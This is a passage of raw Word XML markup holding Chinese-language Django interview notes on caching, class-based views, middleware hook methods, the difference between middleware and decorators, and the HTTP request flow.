          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    process_view    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D12D491" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">AuthenticationMiddleware：认证中间件    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0671A64E" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    request.user：登录的用户对象   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63B9BC44" w14:textId="550C2620" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    request.user：匿名用户类的对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10D60A91" w14:textId="4BD57397" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00C97D3B"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t>030</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>简述</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>下（内建的）缓存机制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E60055C" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>你的缓存配置是通过setting 文件的CACHES 配置来实现的:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44BA8C76" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        CACHES保存位置：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43AB7664" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    1. 服务器内存(默认)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23E9A6E8" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    2. 保存到数据库的表中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55B4DE2F" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    3. 保存到文件中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A2CE48D" w14:textId="6B2B0E4F" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    4. 保存到内存型数据库：redis Memcached</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0748CA7F" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        缓存级别：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E8D1260" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    1. 整站缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5506B51B" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    2. 视图缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D5EAA8A" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    3. 模板片段缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33C17941" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="205575AD" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    底层缓存API:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09903722" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.core.cache </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>import</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> cache</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C9FB930" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    cache.set(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>'&lt;key&gt;'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>'&lt;value&gt;'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>): 设置缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16905C3A" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    cache.get(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>'&lt;key&gt;'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>): 获取缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3019D1D6" w14:textId="51DECB53" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    cache.delete(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>'&lt;key&gt;'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>): 删除缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6993C147" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00C97D3B">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="222226"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="222226"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>Django项目常见面试题</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44539B0B" w14:textId="1FFE4BEC" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00C97D3B"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001</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类视图</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="566FCEC2" w14:textId="7777777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以函数的方式定义的视图称为函数视图，函数视图便于理解。但是遇到一个视图对应的路径提供了多种不同HTTP请求方式的支持时，便需要在一个函数中编写不同的业务逻辑，代码可读性与复用性都不佳。就比如说项目里面的注册时，需要先判断用户是get请求还是post请求，然后再根据这些请求来进行处理。其他模块如果也要判断是get还是post请求的话，也要在啪啦啪啦写一遍。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B14B836" w14:textId="4940BE4D" w:rsidR="00D8288D" w:rsidRPr="00A2037A" w:rsidRDefault="00A63022" w:rsidP="00A2037A">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="EEF0F4"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="330" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>如果用了类视图就不一样了，我们可以定义一个类。类里面封装get方法和post方法，如果其他模块想要使用直接调用继承这个类视图就可以啦。就是说项目里面用的drf，他就是有很多类视图，就比如说APIView (以常规的方法实现get post put delet 等)，我们可以直接继承，如果部分过程有改变，就可以继承之后再重写。代码的可读性就会比较好，就很方便。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50B58702" w14:textId="0E8E7B16" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="390" w:lineRule="atLeast"/>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Django 在中间件中预置了六个方法，这六个方法的区别在于不同的阶段执行，对输入或输出进行干预。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5129E6E1"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1.初始化：无需任何参数，服务器响应第一个请求的时候调用一次，用于确定是否启用当前中间件。 1．def </w:t>
      </w:r>
      <w:r w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>init</w:t>
      </w:r>
      <w:r w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(): 2． pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="271664A3"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2.处理请求前：在每个请求上调用，返回 None 或 HttpResponse 对象。 1．def process_request(request): 2． pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="537B260B"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3.处理视图前：在每个请求上调用，返回 None 或 HttpResponse 对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68266F9C"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''1．def process_view(request, view_func, view_args, view_kwargs): 2． pass"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="510DF4DA"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4.处理模板响应前：在每个请求上调用，返回实现了 render 方法的响应对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C900BDC"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"1．def process_template_response(request, " response):2． pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62267959"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5.处理响应后：所有响应返回浏览器之前被调用，在每个请求上调用，返回 HttpResponse 对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1563591B"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"1．def process_response(request, " response): 2． pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B47D7A1"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6.异常处理：当视图抛出异常时调用，在每个请求上调用，返回一个 HttpResponse 对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F092593" w14:textId="1F5E2F43"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“1．def process_exception(request,exception): 2． pass”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF36E09" w14:textId="7777777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lastRenderedPageBreak/>
        <w:t>中间件是一个用来处理Django的请求和响应的框架级别的钩子。它是一个轻量、低级别的插件系统，用于在全局范围内改变Django的输入和输出。每个中间件组件都负责做一些特定的功能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A587219"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说的直白一点中间件是帮助我们在视图函数执行之前和执行之后都可以做一些额外的操作，它本质上就是一个自定义类，类中定义了几个方法，Django框架会在请求的特定的时间去执行这些方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F0CD8CD"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还可以自定义些中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21D15638" w14:textId="6E1DFA01"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常用5个</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D44D25C" w14:textId="5646223B" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A54E19"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003</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Django</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中间件与装饰器的区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76E55B10" w14:textId="6446F0C8"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Django中的中间件是一个轻量级、底层的插件系统，可以介入Django的请求和响应处理过程，修改Django的输入或输出。中间件的设计为开发者提供了一种无侵入式的开发方式，增强了Django框架的健壮性。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57E361E8" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A2037A">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="EEF0F4"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="360" w:lineRule="exact"/>
        <w:contextualSpacing/>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我们可以使用中间件，在Django处理视图的不同阶段对输入或输出进行干预。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F1941F3" w14:textId="77777777" w:rsidR="00D8288D"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作用：在视图函数执行之前先去进行处理，在视图函数执行之后再去进行收尾工作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D7AEF92" w14:textId="77777777" w:rsidR="00D8288D"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在Django创建的时候，Django默认会给我们加6个中间件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5202C03A" w14:textId="77777777" w:rsidR="00D8288D"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“比如session和csrf,在视图函数执行前，我们就需要对它进行处理，可以使用装饰器来做，也可以使用中间件来处理。”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="492FED1A" w14:textId="10456A11"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区别：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52560812" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00A63022" w:rsidP="00A2037A">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="EEF0F4"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="360" w:lineRule="exact"/>
        <w:contextualSpacing/>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装饰器：主要是作用域问题。如果给视图函数上面添加装饰器，它能够保证这个视图的方法在执行之前或执行之后被执行。但是它仅仅适用于哪些视图添加装饰器，那些视图会有这些作用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EA7E6E5" w14:textId="4E9557CC" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A2037A">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="EEF0F4"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="360" w:lineRule="exact"/>
        <w:contextualSpacing/>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中间件：不会区分是哪个视图，所有的视图统统一视同仁，都会执行之前进行处理或请求之后进行处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A51C0FA" w14:textId="77777777"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如果是做一个普遍的处理，不去区分视图的话，就用middleware避免编写重复功能的代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62EE9D06" w14:textId="77777777" w:rsidR="00D8288D"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本质上就是一个自定义类，类中定义了几个方法，Django框架会在请求的特定的时间去执行这些方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D64EBDE" w14:textId="49808802"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可以用于登录时的黑名单验证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33B99491" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A2037A">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="EEF0F4"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="360" w:lineRule="exact"/>
        <w:contextualSpacing/>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可以自定义一个模块文件做登录校验的中间件，然后 在settings.py里的下面列表中添加自定义的中间件来激活该中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78A85E9E" w14:textId="77777777" w:rsidR="00D8288D"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详见：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71854E3F" w14:textId="770AE962"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Django学习(三)：中间件：</w:t>
      </w:r>
      <w:hyperlink r:id="rId355" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>https://blog.csdn.net/hua1011161696/article/details/80820228</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="125B281D"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说一下中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2217C358" w14:textId="6E42C3B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middleware是用于处理的，就比如说request对象进来，首先它会经过request的middleware进行处理，它会返回两个结果，如果它是返回None,它就会继续下去，如果它返回一个response,它就会进入response的middleware，就直接返回到前端了。如果是返回None就会进入到下面一步，就是那个url的config，对他的路由进行处理。然后后面的话就是进入view的middleware.就是说的话，他的middleware就像跟一个钩子一样，它就对整个流程里的某一步的部分处理和调整，获得的一些结果。就大概是这个情况。”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04ADD593" w14:textId="0040E2F9" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A54E19"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color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>004</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>处理</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>http</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>过程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D08C63"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lastRenderedPageBreak/>
        <w:t>一个 HTTP 请求，首先被转成一个 HttpRequest对象，然后该对象被传递给Request中间件处理，如果该中间件返回了Response，则直接传递给 Response 中间件做收尾处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0688B1FC"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否则的话 Request 中间件将访问 URL 配置，确定哪个 view 来处理，在确定了哪个 view 要执行，但是还没有执行该 view 的时候，系统会把 request 传递给view中间件处理器进行处理，如果该中间件返回了Response，那么该 Response 直接被传递给Response中间件进行后续处理，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1637DE68"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否则将执行确定的view函数处理并返回Response，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BE70A46" w14:textId="4520CBD1"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在这个过程中如果引发了异常并抛出，会被 Exception 中间件处理器进行处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0981D6CE"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&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>http</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>请求，</w:t>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p>
    <w:p w14:paraId="551A593A"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初始化转为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
